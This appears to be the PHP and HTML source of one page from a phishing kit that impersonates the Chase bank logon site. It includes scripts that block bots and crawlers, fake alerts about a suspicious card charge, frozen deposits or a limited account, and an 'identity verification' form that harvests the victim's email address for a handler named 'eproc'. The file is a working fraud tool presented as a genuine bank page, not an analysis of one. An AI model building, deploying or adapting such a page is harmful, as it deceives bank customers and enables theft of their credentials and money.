<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "../settings.php";
?>
<!DOCTYPE html>
<html class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8"/>
        <meta name="robots" content="noindex,nofollow" />
        <title>Chase Online</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
        <link rel="shortcut icon" href="style/img/chasefavicon.ico"/>


<style>
        .spinnerWrapper{position:absolute;width:100%;top:45%;text-align:center}#chaseSpinnerID.jpui.spinner{display:inline-block;overflow:visible!important;padding-top:0;margin-top:-50%}#chaseSpinnerID.jpui.spinner:after{content:"\0020";-moz-animation:three-quarters-loader 780ms infinite linear;-webkit-animation:three-quarters-loader 780ms infinite linear;animation:three-quarters-loader 780ms infinite linear;border:4px solid #ccc;border-right-color:#0092ff;border-radius:50%;box-sizing:border-box;display:inline-block;position:relative;width:48px;height:48px}@media(max-width:991px){#chaseSpinnerID.jpui.spinner:after{width:38px;height:38px}}@media(max-width:767px){#chaseSpinnerID.jpui.spinner:after{width:28px;height:28px}}#chaseSpinnerID.jpui.spinner:before{content:"Loading";color:transparent;position:absolute;bottom:-1.25rem;font-size:1rem}#chaseSpinnerID.jpui.spinner:focus{outline:0}@-moz-keyframes three-quarters-loader{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes three-quarters-loader{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes three-quarters-loader{0%{-moz-transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);transform:rotate(360deg)}}#chaseSpinnerID.jpui.spinner .util.accessible-text{position:absolute!important;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0!important;border:0!important;height:1px!important;width:1px!important;overflow:hidden}BODY{overflow-x:hidden;overflow-y:auto;margin:0}#init,#body{opacity:0;-webkit-transition:opacity .5s;transition:opacity .5s}#init{z-index:-1;background:#fff;position:fixed;top:0;left:0;min-width:100%;min-height:110%}     





.spinner:after, .mask:after {
    content: '';
    position: fixed;
    z-index: -1;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    
background: #1c4f82;
    background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);
    -moz-opacity: .9;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
}


</style>
<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },800);
  }
}
</script>




        <link rel="stylesheet" href="style/css/blue-ui.css">
<link rel="stylesheet" href="style/css/fonto.css">
        <link rel="stylesheet" href="style/css/logon.css">
<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "100%";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
	document.getElementById("sssddddvvvv").style.visibility = "visible";
}
</script>


<style>
.sidenav {
    height: 100%;
    width: <?php if(!isset($_GET['sfailed']) && !isset($_GET[''.$theerrkey.'']) && !isset($_GET['ctart'])){echo '100%';} else{echo '0';};?>;
	position: fixed;
        z-index: 5;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ffffff;
    opacity: 0.9;
    overflow-y: auto;
    transition: 0.5s;
}

.sidenav a {
	font-weight:500;
    font-size: 1.1rem;

}
.sidenav a:hover{
    color: #f1f1f1;
}
.sidenav .closebtn {
    position: absolute;
    top: 0;
    right: 25px;
    font-size: 36px;
    margin-left: 50px;
}
</style>


<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}


.vx_btn.vx_btn-seco, .vx_btn-small.vx_btn-secon, .vx_btn-medium.vx_btn-seco {


background-color: transparent;
    border-color: #0070ba;
    color: #0070ba;
    margin-right: 0;
    margin-left: 0;
    width: 100%;
}
</style>

<style type="text/css">.jpui.background.image { background-image: url(./style/img/background.desktop.day.4.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='./style/img/background.desktop.day.4.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='./style/img/background.desktop.day.4.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(./style/img/background.desktop.day.4.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(./style/img/background.desktop.day.4.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(./style/img/background.desktop.day.4.jpeg); } }

#redicha{color:#0b6efd;text-decoration:underline;transition:display 0.8s;}
	.transitioning{height:14px;width:14px;vertical-align:middle;display:inline-block;padding-right:30px;}
	.redicha{height:14px;width:14px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:3px solid #0b6efd;border-right:3px solid #0b6efd;border-bottom:3px solid #0b6efd;border-top:3px solid #fff;border-radius:100%;display:inline-block;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
</style>
</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div id="spinarrrrrr" style="display:none">
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;">
<div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>
<div id="fixed" >
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;">
<div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>


<div data-is-view="true"><div class="" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"></div> <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> 





<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"> <div><a href="#" data-attr="LOGON_SUMMARY_MENU.requestChaseHomepage"><div class="chase logo"></div> <span class="util accessible-text" data-attr="LOGON_SUMMARY_MENU.chaseLogoAda">Chase.com homepage</span></a></div> </div></header> <main id="logon-content" data-has-view="true"><div class="container logon" data-is-view="true"><div><div id="backgroundImage"><div class="jpui background image fixed show-xs show-sm" id="geoImage"></div></div></div> <div class="row"><div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">



<div id="mySidenav" class="sidenav" style="opacity:0.94">
<div id="tbadkatviry">
<br><br>
<br><br>
<br><br>
<br>
<div>
<div style="text-align: center;">
<span class="stepLogo paymentStepLogo" data-reactid="14"></span>
<div class="centerContainer contextStep firstLoad" data-reactid="9">
<div class="paymentContainer" data-reactid="10"><div data-reactid="11" style="padding:0 20px;top:10%;">
<div ><span class="stepLogo regStepLogo"></span></div>

	<h2><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div><?php if($cautioncontent=='card'){echo 'We have noticed a suspicious use of your card';} elseif($cautioncontent=='deposit'){echo 'Fraudulent deposits';} elseif($cautioncontent=='update'){echo 'Update account informations';} else{echo 'Action Required. ';};?></h2>
	<h3 style="font-size:1.1rem;text-align:<?php if($cautioncontent=='card' || $cautioncontent=='deposit'){echo 'left';} ?>;"> <?php if($cautioncontent=='card'){echo '<b style="text-decoration:underline;">Approved Transaction(s)</b><br><br> Online merchant: www.houseofindya.com<br>Amount: $349.99<br>Date: '.date('m/d/Y');} elseif($cautioncontent=='deposit'){echo 'Our systems have deemed your recent deposits fraudulent, Your account is now under review and subject to termination. Your current balance as well as all incoming and outgoing transfers are currently frozen';} elseif($cautioncontent=='update'){echo 'Your account has been limited, We take the security of our customers as top priority, We need additional information from you,';} else{echo 'Due to conflicts we are having verifying some informations on your account, we have decided to place a temporary hold until you make some required actions and verify ';};?>
	
<br></h3><br>
	<h3 style="margin-bottom:15px;font-size:1.1rem;<?php if($cautioncontent=='card' || $cautioncontent=='deposit'){echo 'text-align:left';} ?>;"><?php if($cautioncontent=='card'){echo 'If you or someone you authorized didn\'t make this charge, please click <a onclick="closeNav()" href="javascript:void(0)">Not Authorized</a>. You are required to confirm the information we have on file and verify your identity.';} elseif($cautioncontent=='deposit'){echo 'If you feel this is wrong click <a onclick="closeNav()" href="javascript:void(0)">This is a mistake</a>';}  elseif($cautioncontent=='update'){echo ' Please click <a onclick="closeNav()" href="javascript:void(0)">continue</a> to update the information we have on file and verify your identity. ';} else{echo 'To restore your account, please click <a onclick="closeNav()" href="javascript:void(0)">continue</a> to update the information we have on file and verify your identity. ';};?> </h3>   

<button type="submit" onclick="closeNav()" id="proceedToLocateUserId" class="jpui button focus primary" data-attr="LOGON_PASSWORD_RESET.nextLabel"><span class="label"><?php if($cautioncontent=='card'){echo 'Not Authorized';} elseif($cautioncontent=='deposit'){echo 'This is a mistake';} else{echo 'Continue';};?></span> </button>

<h3 style="margin-bottom:15px;font-size:0.85rem;<?php if($cautioncontent=='card'){echo 'text-align:left';} ?>;"><?php if($cautioncontent=='card'){echo 'A new bank card will be shipped to you within two weeks if not authorized. Continue using your card as usual until it arrives, do not request a new debit card until then as this is an automated process after verification is completed';} elseif($cautioncontent=='deposit'){echo 'Proceeding will prompt you to confirm the information we have on file and verify your identity.';} else{echo 'Proceeding will prompt you to enter informations we need and will use to know if you are the owner of the informations';};?> </h3> 

</div></div></div>
</div></div>
</div>

</div>


<div id="sssddddvvvv" style ="background: rgba(255,255,255,.96);
border-radius: 5px;
    padding: 1.25rem 0;
    margin: 0 auto;
    visibility: <?php if(!isset($_GET['sfailed']) && !isset($_GET[''.$theerrkey.'']) && !isset($_GET['ctart'])){echo 'hidden';} else{echo 'visible';};?>;
	transition:visibility 0.5s ease-in 0.5s;"
 class="jpui raised "><div class="row"><div class="col-xs-10 col-xs-offset-1">
 

<div style="text-align: center;">
<h2   id="emailh1" >Confirm E-Mail Account<span class="util high-contrast"></span></h2>

<div id="emailh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li  class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li  id="progress-progressBar-step-2"></li><li id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>

</div>


<form id="loginfo" method="POST" autocomplete="off" action="eproc<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" onsubmit="return validate();">

<div id="errorremail">
	<div id='validator-error-header' style="display:<?php if(!isset($_GET['sfailed']) && !isset($_GET[''.$theerrkey.''])){echo 'none';};?>;"><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error' style="width:100%;font-size:15px;"><span class='util accessible-text' id='icon-logon-error'>Important: </span><span id="ErrorMessage">Invalid Email address. Please try again.<div style="margin-top:7px;">We will query your email service provider to confirm you own this email.</div></span></h2> </div></div></div>
</div>

	<h2 class='title' style="width:100%;font-size:15px;">Enter the email address we have on file</h2>
 <input type="email"style="border:1px solid #ccc;"  class="jpui input logon-xs-toggle " id="email" placeholder="E-mail Address" name="email" required="required" />  
 
 <input type="hidden" name="yoochi" value="<?php echo uniqid(); ?>"/>  
<div>
	<div><div class='jpui error error inverted primary animate alert' id='logon-error' role='region' style="margin-bottom:0px;"><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' style="color:#0b6efd" aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error' style="color:#555;width:100%;font-size:15px;letter-spacing:0.1px;"><span>We need you to verify the email contact information on file to save this device as a <span style="color:#0b6efd">Trusted Device</span><br/><br/>Using industry standard encryption to protect your data, we instantly confirm your email on file and then establish a secure connection to verify with your email service provider</span></h2> </div></div></div>
	<p style="font-size:14px;display:none;" id="redicha"><span class='transitioning'><span class='redicha'>&nbsp;</span></span>Redirecting you to your email service provider to confirm you own this email address....
    <input type="hidden" value="off" id="janmns"></p>
</div>
<button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>

</form>



</div>

</div></div><script>//closeNav()</script></div></div></div></main>



</div></div></div>

<br><br>
<br>
<br>
<br>
<br>
<br>



<div class="footer-container" data-is-view="true" style="position: static;">
<div class="container"><div class="social-links row"><div class="col-xs-12"><span class="follow-us-text">Follow us:</span> <ul class="icon-links"><li class="facebook"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseFacebook"><i class="jpui facebook icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="instagram"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseInstagram"><i class="jpui instagram icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="twitter"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseTwitter"><i class="jpui twitter icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="youtube"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseYouTube"><i class="jpui youtube icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="linkedin"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedIn"><i class="jpui linkedin icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li></ul></div></div> <div class="footer-links row"><div class="col-xs-12"><ul><li><a href="#" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact us</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms of use</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE Act: Chase Mortgage Loan Originators</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair Lending</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About Chase</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P. Morgan</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan Chase &amp; Co.</a></li><?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espanol</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase Canada</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li> <li>Member FDIC</li> <li><i class="jpui equal-housing-lender icon" id="undefined" aria-hidden="true"></i> Equal Housing Lender</li> <li class="copyright-label">&copy; <?php echo date('Y');?> JPMorgan Chase &amp; Co.</li></ul></div></div> <div class="row galaxy-footer"><div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">&copy; <?php echo date("Y");?> JPMorgan Chase &amp; Co.</span><br> <a class="NOTELINK" href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy <i class="jpui progressright icon end-icon" aria-hidden="true"></i></a><br> <a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p></div></div></div>
</div>


<script>
// closeNav();
"use strict"
document.getElementById("loginfo").setAttribute("novalidate",true);
function load(){document.getElementById('spinarrrrrr').style.display="block";}
function stopload(){document.getElementById('spinarrrrrr').style.display="none";};

function disperr(){document.getElementById('validator-error-header').style.display="block";}
function clrerr(){document.getElementById('validator-error-header').style.display="none";};
function writerr(msg){document.getElementById('ErrorMessage').innerHTML=msg;}

function reqload(){document.getElementById('redicha').style.display="block";};

function waitreq(){reqload();var suballow=document.getElementById('janmns');setTimeout(function(){suballow.value="on";document.getElementById('loginfo').submit();},3000);if(suballow.value!='off'){return false;} else{return false;};};

function validate(){var email=document.getElementById("email");clrerr();var self=document.getElementById("loginfo"); var input = self.querySelectorAll(["input[required]"]);var emptylist=[];for(var i=0;i<input.length;i++){input[i].onblur=clrerr;input[i].oninput=clrerr;if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){input[emptylist[0]].focus();stopload();writerr("All fields are required !");for(var i of emptylist){disperr()};return false;} else{if( /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(email.value.toLowerCase())==false){email.focus();stopload();writerr("Invalid email address");disperr();return false;} else{waitreq();return false;};}; };
</script>


</body></html>